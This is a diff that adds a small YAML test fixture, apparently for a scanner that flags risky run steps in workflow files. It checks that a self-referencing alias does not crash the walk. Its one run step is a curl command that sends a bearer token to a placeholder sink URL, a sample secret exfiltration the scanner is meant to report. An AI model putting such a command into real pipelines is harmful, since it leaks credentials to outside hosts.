@@ -1,0 +1,3 @@
+# A cyclic alias must not blow the walk (RecursionError was rc 1, indistinguishable from
+# "violations found"): the container is walked once, and the one real site is still reported.
+a: &a [*a, {run: "curl --disable --noproxy '*' -sS -H \"Authorization: Bearer ${FIXTURE_TOKEN}\" \"$SINK_URL\""}]
